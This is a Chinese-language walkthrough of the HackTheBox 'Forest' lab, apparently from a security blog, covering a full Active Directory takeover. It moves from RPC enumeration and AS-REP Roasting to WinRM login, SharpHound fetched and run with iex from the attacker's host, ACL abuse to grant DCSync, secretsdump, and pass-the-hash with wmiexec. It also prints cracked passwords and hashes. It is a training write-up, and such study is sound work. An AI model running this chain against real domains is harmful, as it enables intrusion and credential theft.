Forest是一个简单的靶机，知识点涉及RPC、AS-REP
Roasting、WinRM登陆、BloodHound信息收集、DCSync等。感兴趣的同学可以在HackTheBox中进行学习。

![截屏2022-03-11
上午10.49.53](https://image.3001.net/images/20220322/1647935062_62397e56387a7749cde8f.png!small)  
 _通关思维导图_  
![Forest](https://image.3001.net/images/20220322/1647935064_62397e58b78b7ae50f690.png!small)

## 0x01 侦查

### 端口探测

首先使用 nmap 进行端口扫描

    
    
    nmap -Pn -p- -sV -sC -A 10.10.10.161 -oA nmap_Forest
    

![截屏2022-03-11
下午3.54.36](https://image.3001.net/images/20220322/1647935066_62397e5acb6aa430eb4cf.png!small)  
扫描结果显示目标开放了53、88、135、445、5985等端口

#### 53端口

在本地`hosts`文件中进行DNS解析域名`htb.local`、`forest.htb.local`

    
    
    vim /etc/hosts
    ## 配置
    10.10.10.161 htb.local
    10.10.10.161 forest.htb.local
    

尝试进行区域传输，无果

    
    
    dig axfr @10.10.10.161 htb.local
    

![截屏2022-03-12
下午10.27.27](https://image.3001.net/images/20220322/1647935073_62397e61baadc79a6a60a.png!small)

#### 445端口

使用 smbmap 查看 smb 服务

    
    
    smbmap -H 10.10.10.161
    smbmap -H 10.10.10.161 -u mac -p mac
    

![截屏2022-03-12
下午11.30.57](https://image.3001.net/images/20220322/1647935074_62397e62a7c7ae05b623b.png!small)  
没有发现共享目录，使用 smbclient 进行探测也无法列出共享

    
    
    smbclient -N -L //10.10.10.161
    

![截屏2022-03-12
下午11.32.19](https://image.3001.net/images/20220322/1647935075_62397e63a20f700ca662c.png!small)

RPC远程过程调用枚举用户，成功拿到用户列表、用户组

    
    
    rpcclient -U "" -N 10.10.10.161
    rpcclient > enumdomusers
    rpcclient > enumdomgroups
    

![截屏2022-03-13
上午12.48.57](https://image.3001.net/images/20220322/1647935076_62397e64c076e859b6830.png!small)  
![截屏2022-03-13
上午2.27.49](https://image.3001.net/images/20220322/1647935078_62397e66b5e753918a459.png!small)  
查询域管理员组以及对应的管理员用户

    
    
    rpcclient > querygroup 0x200
    rpcclient > querygroupmem 0x200
    rpcclient > queryuser 0x1f4
    

![截屏2022-03-13
上午2.31.28](https://image.3001.net/images/20220322/1647935080_62397e6885522cdc0b997.png!small)

## 0x02 上线[svc-alfresco]

### AS-REP Roasting

AS-REP Roasting是一种针对kerberos协议的攻击技术，在之前我们也讲到过
kerberoasting。那它们之间有什么区别呢？kerberoasting
通常需要域上的凭据才能进行身份验证，在域中提取服务帐户凭据哈希来进行离线破解。而 AS-REP Roasting
可提取账户哈希来进行离线暴力破解，前提是需要账户开启`不使用Kerberos预认证`或将`uf_dont_require_preauth`设置为true。

正好在之前的检查中我们发现许多账户，对其进行过滤后拿到的用户列表如下

    
    
    Administrator
    andy
    lucinda
    mark
    santi
    sebastien
    svc-alfresco
    

使用 impacket 工具中的 GetNPUsers.py 尝试获取每个用户的哈希值

    
    
    for user in $(cat user.txt);do python3 GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket;done
    

![截屏2022-03-14
上午11.22.32](https://image.3001.net/images/20220322/1647935082_62397e6a43b68a320b157.png!small)  
其中用户 svc-alfresco 存在哈希值，使用 hashcat 进行破解

    
    
    hashcat -m 18200 svc-alfredsco.kerb /usr/share/wordlists/rockyou.txt --force
    

![截屏2022-03-14
下午12.31.09](https://image.3001.net/images/20220322/1647935083_62397e6bd93625e99f195.png!small)  
成功破解密码为`s3rvice`

### WinRM登陆

使用 Evil-WinRM 借助该用户的凭据进行登陆  
 **下载地址：https://github.com/Hackplayers/evil-winrm/releases/tag/v3.3**  
直接安装`gem install evil-winrm`

    
    
    evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice 
    

![截屏2022-03-14
下午12.32.06](https://image.3001.net/images/20220322/1647935085_62397e6d4b64f92ac60e8.png!small)  
在当前用户的桌面查找flag

    
    
    dir c:\Users\svc-alfresco\desktop
    type c:\Users\svc-alfresco\desktop\user.txt
    

![截屏2022-03-14
下午2.37.15](https://image.3001.net/images/20220322/1647935086_62397e6e7ef4a2bfa46cf.png!small)

成功拿到第一个flag

## 0x03 权限提升[administrator]

### 信息枚举

BloodHound 是一种单页的 JavaScript 的Web应用程序，能显示 Active Directory
环境中隐藏的和相关联的主机内容。攻击者常使用 BloodHound 识别高度复杂的攻击路径，防御者亦可借助其识别和防御相同的攻击路径。SharpHound
则可以帮助我们收集 BloodHound 的数据信息，在 BloodHound 中可直接加载该数据

 **下载地址：https://github.com/BloodHoundAD/BloodHound**  
 **下载地址：https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1**

安装 BloodHound

    
    
    apt install bloodhound
    

启动 neo4j

    
    
    neo4j start
    

![截屏2022-03-14
下午3.42.37](https://image.3001.net/images/20220322/1647935087_62397e6f9542335026f46.png!small)

使用默认账号密码 neo4j/neo4j 进行登陆，首次登陆需要修改密码，修改后的密码为`mac.`  
![截屏2022-03-14
下午3.39.02](https://image.3001.net/images/20220322/1647935088_62397e709dcccabf86a0c.png!small)

密码修改完成后在终端启动 BloodHound

    
    
    bloodhound
    

![截屏2022-03-14
下午4.17.14](https://image.3001.net/images/20220322/1647935089_62397e71d14f32800b517.png!small)  
输入账号密码后登陆成功，然后在本地开启 http 服务用于传输`SharpHound.ps1`

    
    
    python3 -m http.server 80
    

将`SharpHound.ps1`加载至当前会话当中

    
    
    cd C:\Users\svc-alfresco\appdata\local\temp
    iex(new-object net.webclient).downloadstring("http://10.10.14.26/SharpHound.ps1")
    

使用获取到的凭证信息调用该脚本

    
    
    invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice
    

![截屏2022-03-14
下午3.56.14](https://image.3001.net/images/20220322/1647935090_62397e72e300ac4844b1a.png!small)  
成功导出 zip 压缩格式的数据文件，在本地开启 smb 共享，需要使用身份认证否则会报错

    
    
    python3 smbserver.py mac -smb2support ~/hackthebox/Machines/Forest -username mac -password mac
    

在靶机中传输压缩文件

    
    
    net use \\10.10.14.26\mac /u:mac mac
    copy 20220314010252_BloodHound.zip \\10.10.14.26\mac\
    net use /d \\10.10.14.26\mac //中断连接
    

![截屏2022-03-14
下午4.05.53](https://image.3001.net/images/20220322/1647935092_62397e740e05b3af8bcd7.png!small)  
在 BloodHound 中加载该压缩包，出现报错信息：无法解压 zip 数据文件  
![截屏2022-03-14
下午4.35.54](https://image.3001.net/images/20220322/1647935093_62397e750e41b4a036f0a.png!small)

原因是在使用 BloundHound 时的版本问题，需要切换至 foss_vnext 分支进行下载使用  
**下载地址：https://github.com/BloodHoundAD/BloodHound/tree/foss_vnext/Collectors**  
![截屏2022-03-15
下午2.25.57](https://image.3001.net/images/20220322/1647935094_62397e761a810ccd36a1f.png!small)  
同时也需要重新下载版本为 4.0.3 的 BloodHound  
![截屏2022-03-15
下午2.37.47](https://image.3001.net/images/20220322/1647935095_62397e779ca87a9d28b51.png!small)

那么我们重复一遍之前的操作  
![截屏2022-03-15
下午2.30.20](https://image.3001.net/images/20220322/1647935097_62397e791689d50198fa3.png!small)  
将新下载的 4.0.3 版本的 BloodHound 移至本地，为 BloodHound 赋予执行权限

    
    
    chmod +x BloodHound
    ./BloodHound --no-sandbox
    

![截屏2022-03-15
下午2.49.45](https://image.3001.net/images/20220322/1647935098_62397e7a307709b2772b8.png!small)  
点击“查找与管理员的最短路径”，从中可以发现`svc-alfresco`的访问权限至`Administrator`需要两次跳转  
![截屏2022-03-15
下午3.01.11](https://image.3001.net/images/20220322/1647935099_62397e7b2f23bebd14464.png!small)

### 加入Exchange Windows组

当前用户在 Service Account 中，后者则是 Privileged IT Account 组当中的成员，与此同时该组也是 Account
Operators 组当中的成员，所以当前用户正处于 Account Operators 组当中。而 Account Operators 组对
Exchange Windows Permissions 组拥有 Generic All 权限。  
![截屏2022-03-15
下午3.51.50](https://image.3001.net/images/20220322/1647935100_62397e7c616e0ce51a0cf.png!small)  
因此我们可以滥用该权限将当前用户添加至 Exchange Windows Permissions 组当中

    
    
    net group "Exchange Windows Permissions" svc-alfresco /add /domain
    net group "Exchange Windows Permissions"
    

![截屏2022-03-15
下午3.57.20](https://image.3001.net/images/20220322/1647935101_62397e7d82a6be5e4d817.png!small)  
成功添加至 Exchange Windows Permissions 组，但是靶机一直在清理 Exchange Windows Permissions
组当中的成员，为了确保当前账户的安全，我们可以新建一个账户

    
    
    net user mac mac@123 /add /domain
    

将其添加至 Exchange Windows Permissions 组当中

    
    
    net group "Exchange Windows Permissions" mac /add /domain
    

![截屏2022-03-15
下午4.28.04](https://image.3001.net/images/20220322/1647935102_62397e7e91fbd6ba26c64.png!small)

借助 PowerSploit 中的 powerview.ps1 来滥用`WriteDacl`权限

    
    
    iex(New-Object Net.webclient).downloadstring('http://10.10.14.26/powerview.ps1')
    

创建凭证对象并授予 DCSync 权限

    
    
    $pass = convertto-securestring 'mac@123' -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential ('HTB\mac', $pass)
    Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity mac -Rights DCSync
    

![截屏2022-03-15
下午4.27.54](https://image.3001.net/images/20220322/1647935103_62397e7f85ea476b9a240.png!small)

### DCSync

> DCSync可从利用DRS(Directory Replication
> Service)协议通过IDL_DRSGetNCChanges从域控制器复制用户凭据

 **DCSync参考文章：https://yojimbosecurity.ninja/dcsync/**  
使用 secretsdump.py 获取哈希值

    
    
    python3 secretsdump.py mac:mac@123@10.10.10.161
    

![截屏2022-03-15
下午4.29.22](https://image.3001.net/images/20220322/1647935104_62397e8098587df876ac5.png!small)

### 管理员登陆

使用 wmiexec.py 通过哈希传递连接管理员

    
    
    python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator@10.10.10.161
    

![截屏2022-03-15
下午4.33.29](https://image.3001.net/images/20220322/1647935106_62397e821d3d1acff9c48.png!small)  
在管理员桌面上寻找 flag

    
    
    dir C:\Users\administrator\Desktop
    type C:\Users\administrator\Desktop\root.txt
    

![截屏2022-03-15
下午4.37.23](https://image.3001.net/images/20220322/1647935107_62397e8332f213c72b977.png!small)

成功拿到第二个flag

除了以上方法，使用 WinRM 也可以成功登陆

    
    
    evil-winrm -i 10.10.10.161 -u administrator -p aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
    

![截屏2022-03-15
下午4.39.34](https://image.3001.net/images/20220322/1647935108_62397e841319287155090.png!small)

**总结：通过RPC远程过程调用发现靶机所处环境为域环境，同时拿到枚举的用户列表。使用AS-REP
Roasting技术可破解用户账户拿到明文密码，GetNPUsers帮助我们拿到了svc-alfresco用户哈希，hashcat则成功破解密码，通过WinRM成功登陆用户。在靶机上可使用SharpHound来收集域内信息，通过BloodHound分析收集到的域内信息。其中出现一个小插曲：kali中默认安装的BloodHound版本存在问题，无法解析SharpHound收集到的数据信息，将其版本切换至4.0.3即可。经过分析后发现当前用户所处组对Exchange
Windows Permissions组拥有Generic
All权限，新建用户mac并将其添加至该用户组，使用DCSync从域控制器复制用户凭据，具体可使用secretsdump获取管理员凭据，最终通过wmiexec或WinRM哈希传递可获取管理员权限。**

